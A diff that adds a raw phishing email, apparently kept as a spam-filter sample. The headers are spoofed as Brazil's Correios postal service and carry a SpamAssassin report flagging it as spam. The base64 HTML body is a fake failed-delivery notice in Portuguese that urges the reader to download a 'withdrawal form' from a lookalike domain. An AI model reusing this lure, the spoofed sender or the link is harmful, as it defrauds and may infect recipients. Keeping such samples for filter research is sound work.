@@ -1,0 +1,139 @@
+Return-Path: <root@vbn7.rlnew.org>
+Delivered-To: contato+spam@ipbtoledo.com.br
+Received: from server.mundotk.com.br
+	by server.mundotk.com.br with LMTP
+	id iBMuItVXBGEvBgAA85qOww
+	(envelope-from <root@vbn7.rlnew.org>)
+	for <contato+spam@ipbtoledo.com.br>; Fri, 30 Jul 2021 16:49:41 -0300
+Return-path: <root@vbn7.rlnew.org>
+Envelope-to: contato@ipbtoledo.com.br
+Delivery-date: Fri, 30 Jul 2021 16:49:41 -0300
+Received: from vbn7.rlnew.org ([5.188.35.184]:53822)
+	by server.mundotk.com.br with esmtp (Exim 4.94.2)
+	(envelope-from <root@vbn7.rlnew.org>)
+	id 1m9WTm-0001FX-3J
+	for contato@ipbtoledo.com.br; Fri, 30 Jul 2021 14:39:32 -0300
+Received: by vbn7.rlnew.org (Postfix, from userid 0)
+	id CC67091B84; Fri, 30 Jul 2021 12:31:50 +0000 (UTC)
+MIME-Version: 1.0
+Content-type:  text/html; charset=UTF-8
+Content-Transfer-Encoding: base64
+From: Correios Web<e-sedex@correios.com.br>
+To: contato@ipbtoledo.com.br
+Message-Id: <20210730153240.CC67091B84@vbn7.rlnew.org>
+Date: Fri, 30 Jul 2021 12:31:50 +0000 (UTC)
+X-Spam-Status: Yes, score=13.0
+X-Spam-Score: 130
+X-Spam-Bar: +++++++++++++
+X-Spam-Report: Spam detection software, running on the system "server.mundotk.com.br",
+ has identified this incoming email as possible spam.  The original
+ message has been attached to this so you can view it or label
+ similar future email.  If you have any questions, see
+ root\@localhost for details.
+ Content preview:  sedex1 INFORMATIVO CORREIOS Prezado(a), 
+ Content analysis details:   (13.0 points, 5.0 required)
+  pts rule name              description
+ ---- ---------------------- --------------------------------------------------
+  0.0 URIBL_BLOCKED          ADMINISTRATOR NOTICE: The query to URIBL was
+                             blocked.  See
+                             http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
+                              for more information.
+                             [URIs: correios-brasil.com]
+  1.2 RCVD_IN_BL_SPAMCOP_NET RBL: Received via a relay in
+                             bl.spamcop.net
+                [Blocked - see <https://www.spamcop.net/bl.shtml?5.188.35.184>]
+  1.3 RCVD_IN_VALIDITY_RPBL  RBL: Relay in Validity RPBL,
+                             https://senderscore.org/blocklistlookup/
+                             [5.188.35.184 listed in bl.score.senderscore.com]
+  1.1 DATE_IN_PAST_03_06     Date: is 3 to 6 hours before Received: date
+  0.2 HEADER_FROM_DIFFERENT_DOMAINS From and EnvelopeFrom 2nd level
+                             mail domains are different
+  0.0 HTML_MESSAGE           BODY: HTML included in message
+  0.0 HTML_FONT_SIZE_LARGE   BODY: HTML font size is large
+  0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
+  2.4 RAZOR2_CF_RANGE_51_100 Razor2 gives confidence level above 50%
+                             [cf: 100]
+  1.7 RAZOR2_CHECK           Listed in Razor2 (http://razor.sf.net/)
+  0.8 CPANEL_LOTS_OF_EMPTY_LINE RAW: Spam that has large block of
+                             empty lines
+  1.0 KAM_LAZY_DOMAIN_SECURITY Sending domain does not have any
+                             anti-forgery methods
+  0.5 KAM_NUMSUBJECT         Subject ends in numbers excluding current years
+  2.6 FSL_BULK_SIG           Bulk signature with no Unsubscribe
+X-Spam-Flag: YES
+Subject:    Ultimo Aviso Sedex Devolvido Nº387462930
+
+PCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFs
+Ly9FTiI+DQoKPGh0bWw+DQoKPGhlYWQ+DQoKDQoKDQoKDQoKICANCgogIA0KCiAgDQoKICA8bWV0
+YSBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSIgaHR0cC1lcXVpdj0iY29u
+dGVudC10eXBlIj4NCgoNCgoNCgoNCgogIA0KCiAgDQoKICANCgogIDx0aXRsZT5zZWRleDE8L3Rp
+dGxlPg0KCjwvaGVhZD4NCgoNCgoNCgo8Ym9keT4NCgoNCgoNCgoNCgo8dGFibGUgY2xhc3M9InN0
+eWxlNCIgc3R5bGU9IndpZHRoOiA1MTZweDsiIGFsaWduPSJjZW50ZXIiPg0KCg0KCg0KCg0KCiAg
+PHRib2R5Pg0KCg0KCg0KCg0KCg0KCg0KCgk8dHI+DQoKDQoKDQoKDQoKDQoKDQoKCQk8dGQgc3R5
+bGU9ImJhY2tncm91bmQtY29sb3I6IHJnYigyNTUsIDI1NSwgMCk7IiBjbGFzcz0ic3R5bGUxIj4N
+CgogICAgICANCgogICAgICANCgogICAgICANCgogICAgICA8ZGl2IHN0eWxlPSJ0ZXh0LWFsaWdu
+OiBjZW50ZXI7Ij48c3BhbiBzdHlsZT0iZm9udC1mYW1pbHk6IEhlbHZldGljYSxBcmlhbCxzYW5z
+LXNlcmlmOyI+PGJyPg0KCg0KCg0KCg0KCiAgICAgIDxicj4NCgoNCgoNCgoNCgogICAgICA8L3Nw
+YW4+PGJpZyBzdHlsZT0iY29sb3I6IHJnYigwLCAyNCwgMTAyKTsgZm9udC13ZWlnaHQ6IGJvbGQ7
+Ij48YmlnPjxiaWc+PGJpZz48c21hbGw+PHNwYW4gc3R5bGU9ImZvbnQtZmFtaWx5OiBUaW1lcyBO
+ZXcgUm9tYW4sVGltZXMsc2VyaWY7Ij5JTkZPUk1BVElWTw0KCkNPUlJFSU9TPC9zcGFuPjwvc21h
+bGw+PC9iaWc+PC9iaWc+PC9iaWc+PC9iaWc+PGJyPg0KCg0KCg0KCg0KCiAgICAgIDwvZGl2Pg0K
+Cg0KCg0KCg0KCiAgICAgIDxicj4NCgoNCgoNCgoNCgogICAgICA8c3BhbiBzdHlsZT0iZm9udC1m
+YW1pbHk6IEhlbHZldGljYSxBcmlhbCxzYW5zLXNlcmlmOyI+PHNwYW4gc3R5bGU9ImZvbnQtd2Vp
+Z2h0OiBib2xkOyI+UHJlemFkbyhhKSw8L3NwYW4+PHNwYW4gc3R5bGU9ImZvbnQtd2VpZ2h0OiBi
+b2xkOyBjb2xvcjogcmdiKDUxLCA1MSwgMjU1KTsiPjwvc3Bhbj48L3NwYW4+PGJyIHN0eWxlPSJm
+b250LWZhbWlseTogSGVsdmV0aWNhLEFyaWFsLHNhbnMtc2VyaWY7Ij4NCgoNCgoNCgoNCgogICAg
+ICA8YnIgc3R5bGU9ImZvbnQtZmFtaWx5OiBIZWx2ZXRpY2EsQXJpYWwsc2Fucy1zZXJpZjsiPg0K
+Cg0KCg0KCg0KCiAgICAgIDxzcGFuIHN0eWxlPSJmb250LWZhbWlseTogSGVsdmV0aWNhLEFyaWFs
+LHNhbnMtc2VyaWY7Ij5BcCZvYWN1dGU7cw0KCkRpdmVyc2FzIFRlbnRhdGl2YXMgZGUgRW50cmVn
+YSBzZW0gc3VjZXNzbyB2aWVtb3MgYXRyYXYmZWFjdXRlO3MgZGVzc2UsDQoKYWxlcnRhciBxdWUg
+byBwcmF6byBwYXJhIHJlc2dhdGFyIHN1YSBlbmNvbWVuZGEgbmEgQWcmZWNpcmM7bmNpYSBkb3MN
+Cgpjb3JyZWlvcyB2ZW5jZSBubyBkaWEgPC9zcGFuPjxiIHN0eWxlPSJmb250LXNpemU6IDE3cHg7
+IGNvbG9yOiByZ2IoMCwgMTM1LCAyMDMpOyI+MzAvMDcvMjAyMQ0KCiZhYWN1dGU7cyAwOTowMDwv
+Yj48YnIgc3R5bGU9ImZvbnQtZmFtaWx5OiBIZWx2ZXRpY2EsQXJpYWwsc2Fucy1zZXJpZjsiPg0K
+Cg0KCg0KCg0KCiAgICAgIDxiciBzdHlsZT0iZm9udC1mYW1pbHk6IEhlbHZldGljYSxBcmlhbCxz
+YW5zLXNlcmlmOyI+DQoKDQoKDQoKDQoKICAgICAgPHNwYW4gc3R5bGU9ImZvbnQtZmFtaWx5OiBI
+ZWx2ZXRpY2EsQXJpYWwsc2Fucy1zZXJpZjsiPkRldmlkbyBhIFBhbmRlbWlhIGRlIDxzcGFuIHN0
+eWxlPSJmb250LXdlaWdodDogYm9sZDsiPkNvdmlkLTE5PC9zcGFuPg0KCmUgYSBhbHRhIGRlbWFu
+ZGEgbmFzIGVudHJlZ2FzIHBlZGltb3MgcXVlIGJhaXhlIG8gZm9ybXVsJmFhY3V0ZTtyaW8gbm8N
+CgpsaW5rIGFiYWl4byBwYXJhIHF1ZSBwb3NzYSBhZ2VuZGFyIG8gaG9yYXJpbyBlIGEgQWdlbmNp
+YSBtYWlzDQoKcHImb2FjdXRlO3hpbWEgcGFyYSByZXRpcmFkYSBkbyBzZXUgUGVkaWRvLjwvc3Bh
+bj48YnI+DQoKDQoKDQoKDQoKICAgICAgPGJyPg0KCg0KCg0KCg0KCiAgICAgIDxicj4NCgoNCgoN
+CgoNCgogICAgICANCgogICAgICANCgogICAgICANCgogICAgICA8ZGl2IHN0eWxlPSJ0ZXh0LWFs
+aWduOiBjZW50ZXI7Ij48Yj48Yj48YSBocmVmPSJodHRwOi8vY29ycmVpb3MtYnJhc2lsLmNvbS9y
+YXN0cmVhbWVudG8/V0FCMDU2RzEwMEsvRm9ybXVsYXJpb19Db3JyZWlvc19HMUowTjNBUlhVRDhW
+OUZCOVlBMDk1MTlHSTBMSS5wZGYiIHJlbD0ibm9yZWZlcnJlciIgY2xhc3M9InYxY2xhc3NlMiIg
+c3R5bGU9ImJvcmRlcjogMXB4IHNvbGlkIHJnYigwLCAxMTIsIDE3Myk7IG1hcmdpbjogNHB4IGF1
+dG87IHBhZGRpbmc6IDVweCA0cHggNHB4OyBmb250LXNpemU6IDE1cHg7IHRleHQtZGVjb3JhdGlv
+bjogbm9uZTsgbWF4LXdpZHRoOiAyMDBweDsgZm9udC1mYW1pbHk6IHByb3hpbWFfbm92YSwmcXVv
+dDtPcGVuIFNhbnMmcXVvdDssJnF1b3Q7bHVjaWRhIGdyYW5kZSZxdW90OywmcXVvdDtTZWdvZSBV
+SSZxdW90OyxhcmlhbCx2ZXJkYW5hLCZxdW90O2x1Y2lkYSBzYW5zIHVuaWNvZGUmcXVvdDssdGFo
+b21hLHNhbnMtc2VyaWY7IHdpZHRoOiAyNTBweDsgY29sb3I6IHdoaXRlOyB0ZXh0LWFsaWduOiBj
+ZW50ZXI7IGRpc3BsYXk6IGJsb2NrOyBiYWNrZ3JvdW5kLWNvbG9yOiByZ2IoMCwgMTEyLCAxNzMp
+OyIgdGFyZ2V0PSJfYmxhbmsiPjxiPkZvcm11bGFyaW8gZGUgcmV0aXJhZGE8L2I+PC9hPjwvYj48
+L2I+PGJyPg0KCg0KCg0KCg0KCiAgICAgIDwvZGl2Pg0KCg0KCg0KCg0KCiAgICAgIA0KCiAgICAg
+IA0KCiAgICAgIA0KCiAgICAgIDxwIHN0eWxlPSJmb250LXNpemU6IDE2cHg7IGNvbG9yOiByZ2Io
+MCwgMTM1LCAyMDMpOyBsaW5lLWhlaWdodDogMjJweDsgdGV4dC1hbGlnbjogY2VudGVyOyI+SU5G
+T1JNQSZDY2VkaWw7Jk90aWxkZTtFUzoNCgowODAwIDcyNSA3MjgyICggY2FwaXRhaXMsIHJlZ2km
+b3RpbGRlO2VzIG1ldHJvcG9saXRhbmFzICk8L3A+DQoKDQoKDQoKDQoKDQoKDQoKICAgICAgDQoK
+ICAgICAgDQoKICAgICAgDQoKICAgICAgDQoKICAgICAgPHAgc3R5bGU9ImZvbnQtc2l6ZTogMTJw
+eDsgY29sb3I6IHJnYigxMDEsIDEwMSwgMTAxKTsgbGluZS1oZWlnaHQ6IDIycHg7IHRleHQtYWxp
+Z246IGNlbnRlcjsiPjxzbWFsbD5TZXImYXRpbGRlO28NCgplZmV0dWFkYXMgdHImZWNpcmM7cyB0
+ZW50YXRpdmFzIGRlIGVudHJlZ2EsIHNlbmRvIGEgcHJpbWVpcmEgbm8NCgptZXNtbyBkaWEgZGEg
+Y2hlZ2FkYSBkbyBvYmpldG8gbmEgdW5pZGFkZSBkZQ0KCmRpc3RyaWJ1aSZjY2VkaWw7JmF0aWxk
+ZTtvLiBBIHNlZ3VuZGEgZSBhIHRlcmNlaXJhIHRlbnRhdGl2YXMNCgpzZXImYXRpbGRlO28gcmVh
+bGl6YWRhcyBub3MgZGlhcyAmdWFjdXRlO3RlaXMgaW1lZGlhdGFtZW50ZQ0KCnN1YnNlcXVlbnRl
+cy4gQ2FzbyBhcyB0ciZlY2lyYztzIHRlbnRhdGl2YXMgZGUgZW50cmVnYSBzZWphbQ0KCmZydXN0
+cmFkYXMsIG8gb2JqZXRvIGZpY2FyJmFhY3V0ZTsgZGlzcG9uJmlhY3V0ZTt2ZWwgcGFyYQ0KCmVu
+dHJlZ2EgbmEgYWcmZWNpcmM7bmNpYSBtYWlzIHByJm9hY3V0ZTt4aW1hIGRvDQoKZW5kZXJlJmNj
+ZWRpbDtvIGRvIGRlc3RpbmF0JmFhY3V0ZTtyaW8sIHBlbG8gcHJhem8gZGUgc2V0ZSBkaWFzDQoK
+Y29ycmlkb3MuPC9zbWFsbD48L3A+DQoKDQoKDQoKDQoKICAgICAgDQoKICAgICAgDQoKICAgICAg
+DQoKICAgICAgPHAgc3R5bGU9ImZvbnQtc2l6ZTogMTJweDsgY29sb3I6IHJnYigxMDEsIDEwMSwg
+MTAxKTsgbGluZS1oZWlnaHQ6IDIycHg7IHRleHQtYWxpZ246IGNlbnRlcjsiPlBvbCZpYWN1dGU7
+dGljYQ0KCmRlIFByaXZhY2lkYWRlIGUgbm90YXMgbGVnYWlzIC0gJmNvcHk7IENvcHlyaWdodCAy
+MDIxIENvcnJlaW9zIC0NCgpUb2RvcyBvcyBkaXJlaXRvcyByZXNlcnZhZG9zLjwvcD4NCgoNCgoN
+CgoNCgoNCgoNCgoJCTwvdGQ+DQoKDQoKDQoKDQoKDQoKDQoKCTwvdHI+DQoKDQoKDQoKDQoKDQoK
+DQoKCQ0KCiAgDQoKICANCgogIA0KCiAgPC90Ym9keT4NCgo8L3RhYmxlPg0KCg0KCg0KCg0KCjwv
+Ym9keT4NCgo8L2h0bWw+DQo=
+
+
